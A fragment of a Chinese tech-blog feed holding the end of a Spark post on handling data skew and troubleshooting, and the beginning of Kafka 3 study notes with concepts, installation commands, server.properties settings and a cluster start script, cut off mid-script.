过程中出现的数据倾斜问题，是由于不同的 key对应的数据量不同导致的不同 task 所处理的数据量不同的问题。</p><p>例如，reduce 点一共要处理 100 万条数据，第一个和第二个 task 分别被分配到了 1万条数据，计算 5 分钟内完成，第三个 task 分配到了 98 万数据，此时第三个 task 可能需要 10 个小时完成，这使得整个 Spark 作业需要 10 个小时才能运行完成，这就是数据倾斜所带来的后果。</p><p>注意，要区分开数据倾斜与数据量过量这两种情况，数据倾斜是指少数 task 被分配了绝大多数的数据，因此少数 task 运行缓慢；数据过量是指所有 task 被分配的数据量都很大， 相差不多，所有task 都运行缓慢。</p><h3 id="1-2-数据倾斜的表现">1.2 数据倾斜的表现</h3><ul><li>Spark 作业的大部分 task 都执行迅速，只有有限的几个 task 执行的非常慢，此时可能出现了数据倾斜，作业可以运行，但是运行得非常慢；</li><li>Spark 作业的大部分 task 都执行迅速，但是有的 task 在运行过程中会突然报出 OOM， 反复执行几次都在某一个 task 报出 OOM 错误，此时可能出现了数据倾斜，作业无法正常运行。</li></ul><h3 id="1-3-定位数据倾斜问题">1.3 定位数据倾斜问题</h3><ul><li>查阅代码中的 shuffle 算子，例如 reduceByKey、countByKey、groupByKey、join 等算子，根据代码逻辑判断此处是否会出现数据倾斜</li><li>查看 Spark 作业的 log 文件，log 文件对于错误的记录会精确到代码的某一行，可以根据异常定位到的代码位置来明确错误发生在第几个 stage，对应的 shuffle 算子是哪一个</li></ul><h2 id="2、聚合原数据">2、聚合原数据</h2><h3 id="2-1-避免-shuffle-过程">2.1 避免 shuffle 过程</h3><p>绝大多数情况下，Spark 作业的数据来源都是 Hive 表，这些 Hive 表基本都是经过 ETL 之后的昨天的数据。为了避免数据倾斜，我们可以考虑避免 shuffle 过程，如果避免了 shuffle 过程，那么从根本上就消除了发生数据倾斜问题的可能。</p><p>如果 Spark 作业的数据来源于Hive 表，那么可以先在 Hive 表中对数据进行聚合，例如按照key 进行分组，将同一key 对应的所有value 用一种特殊的格式拼接到一个字符串里去，这样，一个 key 就只有一条数据了；之后，对一个 key 的所有 value 进行处理时，只需要进行map 操作即可，无需再进行任何的 shuffle 操作。通过上述方式就避免了执行 shuffle 操作， 也就不可能会发生任何的数据倾斜问题。</p><p>对于 Hive 表中数据的操作，不一定是拼接成一个字符串，也可以是直接对 key 的每一条数据进行累计计算。要区分开，处理的数据量大和数据倾斜的区别。</p><h3 id="2-2-缩小-key-粒度">2.2 缩小 key 粒度</h3><p>增大数据倾斜可能性，降低每个 task 的数据量，key 的数量增加，可能使数据倾斜更严重</p><h3 id="2-3-增大-key-粒度">2.3 增大 key 粒度</h3><p>减小数据倾斜可能性，增大每个 task 的数据量，如果没有办法对每个 key 聚合出来一条数据，在特定场景下，可以考虑扩大 key 的聚合粒度。</p><p>例如，目前有 10 万条用户数据，当前key 的粒度是（省，城市，区，日期），现在我们考虑扩大粒度，将key 的粒度扩大为（省，城市，日期），这样的话，key 的数量会减少，key 之间的数据量差异也有可能会减少，由此可以减轻数据倾斜的现象和问题。（此方法只针对特定类型的数据有效，当应用场景不适宜时，会加重数据倾斜）</p><h2 id="3、过滤导致倾斜的-key">3、过滤导致倾斜的 key</h2><p>如果在 Spark 作业中允许丢弃某些数据，那么可以考虑将可能导致数据倾斜的 key 进行过滤，滤除可能导致数据倾斜的 key 对应的数据，这样，在 Spark 作业中就不会发生数据倾斜了</p><h2 id="4、提高-shuffle-操作中的-reduce-并行度">4、提高 shuffle 操作中的 reduce 并行度</h2><p>当前面对于数据倾斜的处理没有很好的效果时，可以考虑提高 shuffle 过程中的 reduce 端并行度，reduce 端并行度的提高就增加了 reduce 端 task 的数量，那么每个 task 分配到的数据量就会相应减少，由此缓解数据倾斜问题</p><h4 id="4-1-reduce-端并行度的设置">4.1 <strong>reduce</strong> <strong>端并行度的设置</strong></h4><p>在大部分的 shuffle 算子中，都可以传入一个并行度的设置参数，比如reduceByKey(500)， 这个参数会决定 shuffle 过程中 reduce 端的并行度，在进行 shuffle 操作的时候，就会对应着创建指定数量的reduce task。对于 Spark SQL 中的 shuffle 类语句，比如 group by、join 等， 需要设置一个参数，即spark.sql.shuffle.partitions，该参数代表了 shuffle read task 的并行度， <strong>该值默认是 200</strong>，对于很多场景来说都有点过小。</p><p>增加 shuffle read task 的数量，可以让原本分配给一个 task 的多个key 分配给多个 task， 从而让每个task 处理比原来更少的数据。举例来说，如果原本有 5 个 key，每个 key 对应 10 条数据，这 5 个 key 都是分配给一个 task 的，那么这个 task 就要处理 50 条数据。而增加了shuffle read task 以后，每个 task 就分配到一个key，即每个 task 就处理 10 条数据，那么自然每个 task 的执行时间都会变短了。</p><h4 id="4-2-reduce-端并行度设置存在的缺陷">4.2 <strong>reduce</strong> <strong>端并行度设置存在的缺陷</strong></h4><p>提高 reduce 端并行度并没有从根本上改变数据倾斜的本质和问题（前面方法从根本上避免了数据倾斜的发生），只是尽可能地去缓解和减轻 shuffle reduce task 的数据压力， 以及数据倾斜的问题，适用于有较多 key 对应的数据量都比较大的情况。</p><p>该方案通常无法彻底解决数据倾斜，因为如果出现一些极端情况，比如某个 key 对应的数据量有 100 万，那么无论你的 task 数量增加到多少，这个对应着 100 万数据的 key 肯定还是会分配到一个 task 中去处理，因此注定还是会发生数据倾斜的。所以这种方案只能说是在发现数据倾斜时尝试使用的第一种手段，尝试去用最简单的方法缓解数据倾斜而已，或者是和其他方案结合起来使用。</p><h2 id="5、使用随机-key-实现双重聚合">5、使用随机 key 实现双重聚合</h2><p>当使用了类似于 groupByKey、reduceByKey 这样的算子时，可以考虑使用随机 key 实现双重聚合。首先，通过 map 算子给每个数据的 key 添加随机数前缀，对 key 进行打散，将原先一样的 key 变成不一样的 key，然后进行第一次聚合，这样就可以让原本被一个 task 处理的数据分散到多个task 上去做局部聚合；随后，去除掉每个 key 的前缀，再次进行聚合。</p><p>此方法对于由 groupByKey、reduceByKey 这类算子造成的数据倾斜由比较好的效果， 仅仅适用于聚合类的 shuffle 操作，适用范围相对较窄。如果是 join 类的 shuffle 操作，还得用其他的解决方案。</p><h2 id="6、将-reduce-join-转换为-map-join">6、将 reduce join 转换为 map join</h2><p>正常情况下，join 操作都会执行 shuffle 过程，并且执行的是 reduce join，也就是先将所有相同的 key 和对应的 value 汇聚到一个 reduce task 中，然后再进行join。普通的 join 是会走 shuffle 过程的，而一旦 shuffle，就相当于会将相同 key 的数据拉取到一个 shuffle read task 中再进行 join，此时就是 reduce join。但是<strong>如果一个RDD 是比较小的，则可以采用广播小 RDD 全量数据+map 算子来实现与join 同样的效果，也就是 map join</strong>， 此时就不会发生 shuffle 操作，也就不会发生数据倾斜。（注意，RDD 是并不能进行广播的，只能将 RDD 内部的数据通过 collect 拉取到 Driver 内存然后再进行广播）</p><h3 id="6-1-核心思路">6.1 核心思路</h3><p>不使用 join 算子进行连接操作，而使用 Broadcast 变量与 map 类算子实现 join 操作，进而完全规避掉 shuffle 类的操作，彻底避免数据倾斜的发生和出现。将较小 RDD 中的数据直接通过 collect 算子拉取到Driver 端的内存中来，然后对其创建一个 Broadcast 变量；接着对另外一个RDD 执行 map 类算子，在算子函数内，从 Broadcast 变量中获取较小 RDD 的全量数据，与当前RDD 的每一条数据按照连接 key 进行比对，如果连接 key 相同的话，那么就将两个 RDD 的数据用你需要的方式连接起来。</p><p>根据上述思路，根本不会发生 shuffle 操作，从根本上杜绝了 join 操作可能导致的数据倾斜问题。当 join 操作有数据倾斜问题并且其中一个 RDD 的数据量较小时，可以优先考虑这种方式，效果非常好</p><h3 id="6-2-不适用场景分析">6.2 不适用场景分析</h3><p>由于Spark 的广播变量是在每个Executor 中保存一个副本，如果两个RDD 数据量都比较大， 那么如果将一个数据量比较大的 RDD 做成广播变量，那么很有可能会造成内存溢出</p><h2 id="7、sample-采样对倾斜-key-单独进行-join">7、sample 采样对倾斜 key 单独进行 join</h2><p>在 Spark 中，如果某个 RDD 只有一个 key，那么在 shuffle 过程中会默认将此 key 对应的数据打散，由不同的 reduce 端 task 进行处理。</p><p>当由单个 key 导致数据倾斜时，可有将发生数据倾斜的 key 单独提取出来，组成一个RDD，然后用这个原本会导致倾斜的 key 组成的 RDD 跟其他 RDD 单独 join，此时，根据Spark 的运行机制，此 RDD 中的数据会在 shuffle 阶段被分散到多个 task 中去进行 join 操作</p><p><img src="http://qnypic.shawncoding.top/blog/202401251337085.png" alt></p><h3 id="7-1-适用场景分析">7.1 适用场景分析</h3><p>对于RDD 中的数据，可以将其转换为一个中间表，或者是直接使用 countByKey()的方式，看一个这个 RDD 中各个 key 对应的数据量，此时如果你发现整个 RDD 就一个 key 的数据量特别多，那么就可以考虑使用这种方法。当数据量非常大时，可以考虑使用 sample 采样获取 10%的数据，然后分析这 10%的数据中哪个 key 可能会导致数据倾斜，然后将这个 key 对应的数据单独提取出来</p><h3 id="7-2-不适用场景分析">7.2 不适用场景分析</h3><p>如果一个RDD 中导致数据倾斜的 key 很多，那么此方案不适用</p><h2 id="8、使用随机数扩容进行-join">8、使用随机数扩容进行 join</h2><p>如果在进行 join 操作时，RDD 中有大量的 key 导致数据倾斜，那么进行分拆 key 也没什么意义，此时就只能使用最后一种方案来解决问题了，对于 join 操作，我们可以考虑对其中一个 RDD 数据进行扩容，另一个RDD 进行稀释后再 join。</p><p>我们会将原先一样的 key 通过附加随机前缀变成不一样的 key，然后就可以将这些处理后的“不同 key”分散到多个 task 中去处理，而不是让一个 task 处理大量的相同 key。这一种方案是针对有大量倾斜 key 的情况，没法将部分 key 拆分出来进行单独处理，需要对整个RDD 进行数据扩容，对内存资源要求很高。</p><h3 id="8-1-核心思想">8.1 核心思想</h3><p>选择一个 RDD，使用 flatMap 进行扩容，对每条数据的 key 添加数值前缀（1~N 的数值），将一条数据映射为多条数据；（扩容）选择另外一个 RDD，进行map 映射操作，每条数据的 key 都打上一个随机数作为前缀（1~N 的随机数）；（稀释）将两个处理后的RDD，进行 join 操作</p><p><img src="http://qnypic.shawncoding.top/blog/202401251337086.png" alt></p><h3 id="8-2-局限性与优化">8.2 局限性与优化</h3><p>如果两个RDD 都很大，那么将RDD 进行 N 倍的扩容显然行不通； 使用扩容的方式只能缓解数据倾斜，不能彻底解决数据倾斜问题。当 RDD 中有几个 key 导致数据倾斜时：</p><ul><li>对包含少数几个数据量过大的 key 的那个 RDD，通过 sample 算子采样出一份样本来，然后统计一下每个 key 的数量，计算出来数据量最大的是哪几个key</li><li>然后将这几个 key 对应的数据从原来的RDD 中拆分出来，形成一个单独的 RDD，并给每个 key 都打上n 以内的随机数作为前缀，而不会导致倾斜的大部分 key 形成另外一个RDD</li><li>接着将需要 join 的另一个 RDD，也过滤出来那几个倾斜 key 对应的数据并形成一个单独的 RDD，将每条数据膨胀成 n 条数据，这 n 条数据都按顺序附加一个 0~n 的前缀， 不会导致倾斜的大部分 key 也形成另外一个RDD</li><li>再将附加了随机前缀的独立 RDD 与另一个膨胀 n 倍的独立 RDD 进行 join，此时就可以将原先相同的 key 打散成 n 份，分散到多个 task 中去进行 join 了</li><li>而另外两个普通的RDD 就照常 join 即可。最后将两次 join 的结果使用 union 算子合并起来即可，就是最终的 join 结果</li></ul><h1>五、Spark 故障排除</h1><h2 id="1、控制-reduce-端缓冲大小以避免-OOM">1、控制 reduce 端缓冲大小以避免 OOM</h2><p>在 Shuffle 过程，reduce 端 task 并不是等到 map 端 task 将其数据全部写入磁盘后再去拉取，而是 map 端写一点数据，reduce 端 task 就会拉取一小部分数据，然后立即进行后面的聚合、算子函数的使用等操作。reduce 端 task 能够拉取多少数据，<strong>由 reduce 拉取数据的缓冲区 buffer 来决定</strong>，因为拉取过来的数据都是先放在buffer 中，然后再进行后续的处理，buffer 的默认大小为 48MB。</p><p>reduce 端 task 会一边拉取一边计算，不一定每次都会拉满 48MB 的数据，可能大多数时候拉取一部分数据就处理掉了。虽然说增大 reduce 端缓冲区大小可以减少拉取次数，提升Shuffle 性能，但是有时 map 端的数据量非常大，写出的速度非常快，此时 reduce 端的所有 task 在拉取的时候，有可能全部达到自己缓冲的最大极限值，即 48MB，此时，再加上 reduce 端执行的聚合函数的代码，可能会创建大量的对象，这可难会导致内存溢出，即 OOM。</p><p>如果一旦出现 reduce 端内存溢出的问题，我们可以考虑减小 reduce 端拉取数据缓冲区的大小，例如减少为 12MB。在实际生产环境中是出现过这种问题的，这是典型的以性能换执行的原理。reduce 端拉取数据的缓冲区减小，不容易导致 OOM，但是相应的，reudce 端的拉取次数增加，造成更多的网络传输开销，造成性能的下降。注意，要保证任务能够运行，再考虑性能的优化。</p><h2 id="2、JVM-GC-导致的shuffle-文件拉取失败">2、JVM GC 导致的shuffle 文件拉取失败</h2><p>在 Spark 作业中，有时会出现 shuffle file not found 的错误，这是非常常见的一个报错， 有时出现这种错误以后，选择重新执行一遍，就不再报出这种错误。出现上述问题可能的原因是 Shuffle 操作中，后面 stage 的 task 想要去上一个 stage 的task 所在的 Executor 拉取数据，结果对方正在执行GC，执行 GC 会导致 Executor 内所有的工作现场全部停止，比如BlockManager、基于 netty 的网络通信等，这就会导致后面的 task 拉取数据拉取了半天都没有拉取到，就会报出 shuffle file not found 的错误，而第二次再次执行就不会再出现这种错误。</p><p>可以通过调整 reduce 端拉取数据重试次数和 reduce 端拉取数据时间间隔这两个参数来对 Shuffle 性能进行调整，增大参数值，使得 reduce 端拉取数据的重试次数增加，并且每次失败后等待的时间间隔加长</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> conf = <span class="keyword">new</span> <span class="type">SparkConf</span>().set(<span class="string">"spark.shuffle.io.maxRetries"</span>, <span class="string">"60"</span>).set(<span class="string">"spark.shuffle.io.retryWait"</span>, <span class="string">"60s"</span>)</span><br></pre></td></tr></table></figure><h2 id="3、解决各种序列化导致的报错">3、解决各种序列化导致的报错</h2><p>当 Spark 作业在运行过程中报错，而且报错信息中含有 Serializable 等类似词汇，那么可能是序列化问题导致的报错。序列化问题要注意以下三点：</p><ul><li>作为RDD 的元素类型的自定义类，必须是可以序列化的；</li><li>算子函数里可以使用的外部的自定义变量，必须是可以序列化的；</li><li>不可以在 RDD 的元素类型、算子函数里使用第三方的不支持序列化的类型，例如Connection</li></ul><h2 id="4、解决算子函数返回-NULL-导致的问题">4、解决算子函数返回 NULL 导致的问题</h2><p>在一些算子函数里，需要我们有一个返回值，但是在一些情况下我们不希望有返回值， 此时我们如果直接返回NULL，会报错，例如 Scala.Math(NULL)异常。如果你遇到某些情况，不希望有返回值，那么可以通过下述方式解决：</p><ul><li>返回特殊值，不返回 NULL，例如“-1”；</li><li>在通过算子获取到了一个RDD 之后，可以对这个 RDD 执行filter 操作，进行数据过滤， 将数值为-1 的数据给过滤掉；</li><li>在使用完 filter 算子后，继续调用 coalesce 算子进行优化。</li></ul><h2 id="5、解决-YARN-CLIENT-模式导致的网卡流量激增问题">5、解决 YARN-CLIENT 模式导致的网卡流量激增问题</h2><p><img src="http://qnypic.shawncoding.top/blog/202401251337087.png" alt></p><p>在 YARN-client 模式下，Driver 启动在本地机器上，而 Driver 负责所有的任务调度，需要与 YARN 集群上的多个Executor 进行频繁的通信。</p><p>假设有 100 个 Executor， 1000 个 task，那么每个 Executor 分配到 10 个 task，之后，Driver 要频繁地跟Executor 上运行的 1000 个 task 进行通信，通信数据非常多，并且通信品类特别高。这就导致有可能在 Spark 任务运行过程中，由于频繁大量的网络通讯，本地机器的网卡流量会激增。</p><p>注意，YARN-client 模式只会在测试环境中使用，而之所以使用 YARN-client 模式，是由于可以看到详细全面的 log 信息，通过查看 log，可以锁定程序中存在的问题，避免在生产环境下发生故障。在生产环境下，使用的一定是 YARN-cluster 模式。在 YARN-cluster 模式下，就不会造成本地机器网卡流量激增问题，如果 YARN-cluster 模式下存在网络通信的问题，需要运维团队进行解决。</p><h2 id="6、解决-YARN-CLUSTER-模式的-JVM-栈内存溢出无法执行问题">6、解决 YARN-CLUSTER 模式的 JVM 栈内存溢出无法执行问题</h2><p>当 Spark 作业中包含 SparkSQL 的内容时，可能会碰到 YARN-client 模式下可以运行，但是YARN-cluster 模式下无法提交运行（报出 OOM 错误）的情况。YARN-client 模式下，Driver 是运行在本地机器上的，Spark 使用的 JVM 的 PermGen 的配置，是本地机器上的 spark-class 文件，JVM 永久代的大小是 128MB，这个是没有问题的， 但是在 YARN-cluster 模式下，Driver 运行在 YARN 集群的某个节点上，使用的是没有经过配置的默认设置，PermGen 永久代大小为 82MB。</p><p>SparkSQL 的内部要进行很复杂的 SQL 的语义解析、语法树转换等等，非常复杂，如果sql 语句本身就非常复杂，那么很有可能会导致性能的损耗和内存的占用，特别是对 PermGen的占用会比较大。所以，此时如果 PermGen 的占用好过了 82MB，但是又小于 128MB，就会出现 YARN-client模式下可以运行，YARN-cluster 模式下无法运行的情况。</p><p>解决上述问题的方法时增加 PermGen 的容量，需要在 spark-submit 脚本中对相关参数进行设置，设置方法如代码清单所示：<code>--conf spark.driver.extraJavaOptions=&quot;-XX:PermSize=128M -XX:MaxPermSize=256M&quot;</code>通过上述方法就设置了Driver 永久代的大小，默认为 128MB，最大 256MB，这样就可以避免上面所说的问题</p><h2 id="7、解决-SparkSQL-导致的-JVM-栈内存溢出">7、解决 SparkSQL 导致的 JVM 栈内存溢出</h2><p>当 SparkSQL 的 sql 语句有成百上千的 or 关键字时，就可能会出现 Driver 端的 JVM 栈内存溢出。JVM 栈内存溢出基本上就是由于调用的方法层级过多，产生了大量的，非常深的，超出了 JVM 栈深度限制的递归。（我们猜测 SparkSQL 有大量 or 语句的时候，在解析 SQL 时， 例如转换为语法树或者进行执行计划的生成的时候，对于 or 的处理是递归，or 非常多时，会发生大量的递归）此时，建议将一条 sql 语句拆分为多条 sql 语句来执行，每条 sql 语句尽量保证 100 个以内的子句。根据实际的生产环境试验，一条 sql 语句的 or 关键字控制在 100 个以内，通常不会导致 JVM 栈内存溢出</p><h2 id="8、持久化与-checkpoint-的使用">8、持久化与 checkpoint 的使用</h2><p>Spark 持久化在大部分情况下是没有问题的，但是有时数据可能会丢失，如果数据一旦丢失，就需要对丢失的数据重新进行计算，计算完后再缓存和使用，为了避免数据的丢失， 可以选择对这个 RDD 进行 checkpoint，也就是将数据持久化一份到容错的文件系统上（比如 HDFS）。</p><p>一个 RDD 缓存并 checkpoint 后，如果一旦发现缓存丢失，就会优先查看 checkpoint 数据存不存在，如果有，就会使用 checkpoint 数据，而不用重新计算。也即是说，checkpoint 可以视为 cache 的保障机制，如果 cache 失败，就使用 checkpoint 的数据。使用 checkpoint 的优点在于提高了 Spark 作业的可靠性，一旦缓存出现问题，不需要重新计算数据，缺点在于，checkpoint 时需要将数据写入 HDFS 等文件系统，对性能的消耗较大</p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、Spark内核原理&lt;/h1&gt;
&lt;h2 id=&quot;1、Spark-内核概述&quot;&gt;1、Spark 内核概述&lt;/h2&gt;
&lt;h3 id=&quot;1-1-简介&quot;&gt;1.1 简介&lt;/h3&gt;
&lt;p&gt;Spark 内核泛指 Spark 的核心运行机制，包括 Spark 核心组件的运行机制、Spark 任务调度机制、Spark 内存管理机制、Spark 核心功能的运行原理等，熟练掌握 Spark 内核原理，能够帮助我们更好地完成 Spark 代码设计，并能够帮助我们准确锁定项目运行过程中出现的问题的症结所在&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Kafka3学习笔记</title>
    <link href="https://blog.shawncoding.top/posts/fe880347.html"/>
    <id>https://blog.shawncoding.top/posts/fe880347.html</id>
    <published>2024-02-06T07:04:17.000Z</published>
    <updated>2024-02-29T12:00:08.270Z</updated>
    
    <content type="html"><![CDATA[<h1>一、Kafka概述和入门</h1><h2 id="1、Kafka概述">1、Kafka概述</h2><h3 id="1-1-定义">1.1 定义</h3><p>Kafka是 一个开源的 分布式事件流平台 （Event StreamingPlatform），被数千家公司用于高性能数据管道、流分析、数据集成和关键任务应用。发布/订阅：消息的发布者不会将消息直接发送给特定的订阅者，而是将发布的消息分为不同的类别，订阅者只接收感兴趣的消息。</p><a id="more"></a><h3 id="1-2-消息队列">1.2 消息队列</h3><p>传统的消息队列的主要应用场景包括：<strong>缓存/消峰、解耦和异步通信</strong>。消息队列的两种模式：</p><ul><li><strong>点对点模式</strong>，消费者主动拉取数据，消息收到后清除消息</li><li><strong>发布/订阅模式</strong>，可以有多个topic主题（浏览、点赞、收藏、评论等）；消费者消费数据之后，不删除数据；每个消费者相互独立，都可以消费到数据</li></ul><h3 id="1-3-Kafka-基础架构">1.3 Kafka 基础架构</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251335693.png" alt></p><ul><li>**Producer：**消息生产者，就是向 Kafka broker 发消息的客户端</li><li>**Consumer：**消息消费者，向Kafka broker 取消息的客户端</li><li><strong>Consumer Group（CG）</strong>：<strong>消费者组，由多个 consumer 组成。消费者组内每个消</strong>费者负责消费不同分区的数据，一个分区只能由一个组内消费者消费；消费者组之间互不影响。<strong>所有的消费者都属于某个消费者组，即</strong>消费者组是逻辑上的一个订阅者</li><li>**Broker：**一台 Kafka 服务器就是一个 broker。一个集群由多个 broker 组成。一个broker 可以容纳多个 topic</li><li>**Topic：**可以理解为一个队列，<strong>生产者和消费者面向的都是一个</strong> <strong>topic</strong></li><li>**Partition：**为了实现扩展性，一个非常大的 topic 可以分布到多个 broker（即服务器）上，<strong>一个</strong> <strong>topic</strong> <strong>可以分为多个</strong> <strong>partition</strong>，每个partition 是一个有序的队列</li><li><strong>Replica：<strong>副本。一个 topic 的每个分区都有若干个副本，一个 <strong>Leader</strong> 和若干个</strong>Follower</strong></li><li>**Leader：**每个分区多个副本的“主”，生产者发送数据的对象，以及消费者消费数据的对象都是Leader</li><li>**Follower：**每个分区多个副本中的“从”，实时从 Leader 中同步数据，保持和Leader 数据的同步。Leader 发生故障时，某个Follower 会成为新的Leader</li></ul><h2 id="2、Kafka-快速入门">2、Kafka 快速入门</h2><h3 id="2-1-安装部署">2.1 安装部署</h3><blockquote><p>官网地址：<a href="https://kafka.apache.org/downloads.html" target="_blank" rel="noopener" title="https://kafka.apache.org/downloads.html">https://kafka.apache.org/downloads.html</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实验配置环境是三台机器分别是hadoop102,103和104，每台机器需要安装zk和kafka,zk和xsync脚本参考之前笔记</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个是scala2.12，然后kafka是3.0版本</span></span><br><span class="line">wget https://archive.apache.org/dist/kafka/3.0.0/kafka_2.12-3.0.0.tgz</span><br><span class="line"></span><br><span class="line">tar -zxvf kafka_2.12-3.0.0.tgz -C /opt/module/</span><br><span class="line"><span class="built_in">cd</span> /opt/module</span><br><span class="line">mv kafka_2.12-3.0.0/ kafka</span><br><span class="line"><span class="comment"># 进入到/opt/module/kafka 目录，修改配置文件</span></span><br><span class="line"><span class="built_in">cd</span> config/</span><br><span class="line">vim server.properties</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入以下内容，三个地方需要修改，id，log地址和zk地址</span></span><br><span class="line"><span class="comment">#broker 的全局唯一编号，不能重复，只能是数字。</span></span><br><span class="line">broker.id=0</span><br><span class="line"><span class="comment">#处理网络请求的线程数量</span></span><br><span class="line">num.network.threads=3</span><br><span class="line"><span class="comment">#用来处理磁盘 IO 的线程数量</span></span><br><span class="line">num.io.threads=8</span><br><span class="line"><span class="comment">#发送套接字的缓冲区大小</span></span><br><span class="line">socket.send.buffer.bytes=102400</span><br><span class="line"><span class="comment">#接收套接字的缓冲区大小</span></span><br><span class="line">socket.receive.buffer.bytes=102400</span><br><span class="line"><span class="comment">#请求套接字的缓冲区大小</span></span><br><span class="line">socket.request.max.bytes=104857600</span><br><span class="line"><span class="comment">#kafka 运行日志(数据)存放的路径，路径不需要提前创建，kafka 自动帮你创建，可以配置多个磁盘路径，路径与路径之间可以用"，"分隔</span></span><br><span class="line">log.dirs=/opt/module/kafka/datas</span><br><span class="line"><span class="comment">#topic 在当前 broker 上的分区个数</span></span><br><span class="line">num.partitions=1</span><br><span class="line"><span class="comment">#用来恢复和清理 data 下数据的线程数量</span></span><br><span class="line">num.recovery.threads.per.data.dir=1</span><br><span class="line"><span class="comment"># 每个 topic 创建时的副本数，默认时 1 个副本</span></span><br><span class="line">offsets.topic.replication.factor=1</span><br><span class="line"><span class="comment">#segment 文件保留的最长时间，超时将被删除</span></span><br><span class="line">log.retention.hours=168</span><br><span class="line"><span class="comment">#每个 segment 文件的大小，默认最大 1G</span></span><br><span class="line">log.segment.bytes=1073741824</span><br><span class="line"><span class="comment"># 检查过期数据的时间，默认 5 分钟检查一次是否数据过期</span></span><br><span class="line">log.retention.check.interval.ms=300000</span><br><span class="line"><span class="comment">#配置连接 Zookeeper 集群地址（在 zk 根目录下创建/kafka，方便管理）</span></span><br><span class="line">zookeeper.connect=hadoop102:2181,hadoop103:2181,hadoop104:2181/kafka</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后分发安装包，在module路径</span></span><br><span class="line">xsync kafka/</span><br><span class="line"><span class="comment"># 分别在 hadoop103 和 hadoop104 上修改配置文件/opt/module/kafka/config/server.properties中的 broker.id=1、broker.id=2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后配置环境变量</span></span><br><span class="line">sudo vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment">#KAFKA_HOME</span></span><br><span class="line"><span class="built_in">export</span> KAFKA_HOME=/opt/module/kafka</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$KAFKA_HOME</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 刷新一下环境变量</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分发环境变量文件到其他节点，并 source</span></span><br><span class="line">sudo /home/atguigu/bin/xsync /etc/profile.d/my_env.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动集群</span></span><br><span class="line"><span class="comment"># 先启动 Zookeeper 集群，然后启动 Kafka，zk脚本zk学习笔记有记录</span></span><br><span class="line">zk.sh start</span><br><span class="line"><span class="comment"># 依次在 hadoop102、hadoop103、hadoop104 节点上启动 Kafka</span></span><br><span class="line"><span class="comment"># 注意：配置文件的路径要能够到 server.properties</span></span><br><span class="line">bin/kafka-server-start.sh -daemon config/server.properties</span><br><span class="line"><span class="comment"># 关闭集群</span></span><br><span class="line">bin/kafka-server-stop.sh</span><br></pre></td></tr></table></figure><h3 id="2-2-集群启停脚本">2.2 集群启停脚本</h3><p>在<code>/home/atguigu/bin</code> 目录下创建文件 <a href="http://kf.sh" target="_blank" rel="noopener">kf.sh</a> 脚本文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line"><span class="string">"start"</span>)&#123;</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> hadoop102 hadoop103 hadoop104</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">" --------启动 <span class="variable">$i</span> Kafka-------"</span></span><br><span class="line">    ssh <span class="variable">$i</span> <span class="string">"/opt/module/kafka/bin/kafka-server-start.sh -daemon /opt/module/kafka/config/server.properties"</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">&#125;;;</span><br><span class="line"><span class="string">"stop"</span>)&#123;</span><br><span 